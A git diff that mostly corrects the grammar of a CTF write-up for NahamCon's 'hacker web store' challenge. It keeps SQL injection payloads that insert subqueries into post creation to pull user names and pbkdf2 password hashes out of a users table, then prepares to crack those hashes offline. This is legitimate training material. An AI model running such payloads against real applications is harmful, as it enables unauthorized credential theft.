@@ -15,15 +15,13 @@ Welcome to the hacker web store! Feel free to look around at our wonderful produ
   
 _This challenge may require a local password list, which we have provided below. **Reminder, bruteforcing logins is not necessary and [against the rules.](https://ctf.nahamcon.com/rules)**_**  
   
-**Press the `Start` button on the top-right to begin this challenge.****
-
 **Attachments:**  [password_list.txt](https://ctf.nahamcon.com/files/0b0df3700fc27beb86dfe2b6d8b077a7/password_list.txt?token=eyJ1c2VyX2lkIjozOTA1LCJ0ZWFtX2lkIjoxODczLCJmaWxlX2lkIjo5M30.ZlJYNQ.2HbqOXfKPZjnZbsNoX0nazWNy88)
 
 ## Detailed solution
 
 http://challenge.nahamcon.com:32399/
 
-We have an app with login page and option to create posts
+We have an app with a login page and the option to create posts.
 
 ![](https://github.com/BaadMaro/CTF/assets/72421091/d6dd28c2-192f-49d3-b123-5997788780be)
 
@@ -31,26 +29,25 @@ We have an app with login page and option to create posts
 
 ![](https://github.com/BaadMaro/CTF/assets/72421091/fd8c75a1-6418-4bc1-a5b0-fb6db3fb85d7)
 
-
-While testing posts creation, i detect a SQL injection while sending `'`
+While testing post creation, I detected a SQL injection while sending `'`
 
 ![Pasted image 20240525223502](https://github.com/BaadMaro/CTF/assets/72421091/a8089dfa-80b5-4fc2-9b75-167f188a951d)
 
-The values used in post creation have always `'` which block using dynamic data.
+The values used in post creation have `'` which block using dynamic data.
 
-We can close the first post values and added next to it a second post with dynamic data like this for description
+We can close the first post value and add next to it a second post with dynamic data like this for the description
 
 ```
 post 1') , ('Product2', '15.99', 'Description2
 ```
 
-I started checking for columns inside users tables and i was able to detect name and password using `SELECT X FROM users`
+I started checking for columns inside users table, and I was able to detect name and password using `SELECT X FROM users`
 
 ```
 1') , ('Product2', (SELECT password FROM users), 'Description3
 ```
 
-We have multiple users so we need to use LIMIT and OFFSET to get all users names and their passwords
+We have multiple users so we need to use LIMIT and OFFSET to get all users names and passwords
 
 ```
 1') , ('Product2', (SELECT name FROM users LIMIT 1 OFFSET 0), 'Description3
@@ -76,11 +73,11 @@ pbkdf2:sha256:600000$GnEu1p62RUvMeuzN$262ba711033eb05835efc5a8de02f414e180b5ce0a
 pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57
 ```
 
-As mentioned in challenge description, we have a custom password list to crack the hashes
+As mentioned in the challenge description, we have a custom password list to crack the hashes
 
-Doing some research, i found that the Hash format is used by Python Werkzeug `generate_password_hash`
+Doing some research, I found that the hash format is used by Python Werkzeug `generate_password_hash`
 
-We need to make a custom function and use the same hash type, iterations and salt to generate hashes from passwords list and compare it to our hashes
+We need to make a custom function and use the same hash type, iterations, and salt to generate hashes from passwords list and compare them to our hashes.
 
 Here is the example for the `website_admin_account` hash
 
